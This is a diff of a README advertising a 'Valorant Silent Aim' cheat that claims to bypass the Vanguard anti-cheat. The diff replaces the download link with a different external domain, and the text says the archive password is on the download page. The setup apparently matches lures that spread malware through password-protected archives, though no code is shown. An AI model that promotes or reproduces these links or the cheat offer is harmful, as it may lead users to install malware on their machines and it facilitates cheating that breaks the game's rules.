@@ -18,7 +18,7 @@ Valorant Silent Aim - undetected cheat for Valorant. Bypasses Vanguard anti-chea
 
 ## Download
 
-[![Download v5.9.0](https://img.shields.io/badge/Download_v5.9.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/valsilentaim2)
+[![Download v5.9.0](https://img.shields.io/badge/Download_v5.9.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valsilentaim2)
 
 > The archive password is shown on the download page.
 
